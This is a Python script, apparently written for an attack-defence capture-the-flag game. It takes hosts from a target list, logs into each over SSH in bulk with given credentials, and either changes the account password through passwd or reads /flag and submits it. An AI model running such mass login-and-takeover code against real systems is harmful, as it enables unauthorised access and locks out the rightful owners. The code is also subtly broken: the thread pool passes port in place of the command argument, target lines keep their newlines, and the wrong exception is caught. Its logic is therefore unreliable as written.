import paramiko
from concurrent.futures import ThreadPoolExecutor
from lib.submit_flag import submit_flag


#可能有问题，后期待改善
def _sshtask(target, username, password: str, new_password:str,cmd,port=22):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(target, username=username, password=password,port=port)
    except Exception as e:
        print("Error: {} ssh connect failed , {}".format(target, e))
        return None

    if cmd == "1":  # 修改密码
        pipe1 = ssh.invoke_shell()
        pipe1.settimeout(10)
        pipe1.recv(9999)  # shell 返回杂乱信息

        pipe1.send(b"passwd\n")  # 修改密码命令 passwd
        resp = pipe1.recv(9999)
        if not resp.endswith(b"Current password: "):
            print("Error: {} run passwd wrong".format(target))
            pipe1.close()
            ssh.close()
            return None

        pipe1.send(password.encode()+b"\n")  # 当前密码
        resp = pipe1.recv(9999)
        if not resp.endswith(b"New password: "):
            print("Error: {} current password error".format(target))
            pipe1.close()
            ssh.close()
            return None

        pipe1.send(new_password.encode()+b"\n")  # 修改密码
        resp = pipe1.recv(9999)
        if not resp.endswith(b"Retype new password: "):
            print("Error: {} new password seems not applicable to policy. Maybe change a new one".format(target))
            pipe1.close()
            ssh.close()
            return None

        pipe1.send(new_password.encode()+b"\n")  # 重复输入密码认证
        resp = pipe1.recv(9999)
        if resp.endswith(b"successfully"):
            print("{} has been changed password. New password is {}".format(target, new_password))
            pipe1.close()
            ssh.close()
            return 1

        if b"You must choose a longer password." in resp:  # 密码太短报错
            print("Error: {} new password seems not applicable to policy. You must choose a longer password.".format(target))
            pipe1.close()
            ssh.close()
            return None

        print("Error: {} changed password failed".format(target))
        pipe1.close()
        ssh.close()
        return None

    if cmd == "2":
        cmd = "cat /flag"

        stdin, stdout, stderr = ssh.exec_command(cmd)
        out_result = stdout.read().decode('utf-8')
        err_result = stderr.read().decode('utf-8')
        if out_result:
            return out_result
        elif err_result:
            return err_result


def sshscan(username, password, new_password, cmd, port):  # run threadPool
    try:
        with open("web_targets.txt", 'r') as f:
            targets = f.readlines()
    except FileExistsError as e:
        print(e)

    with ThreadPoolExecutor(10) as executor:
        futures = [executor.submit(_sshtask, target, username, password, new_password, port) for target in targets]

        if cmd == "2":
            # 处理已完成的任务的future对象
            for future in futures:
                # 通过future.result()函数获取结果
                submit_flag(future.result().strip("\n"))

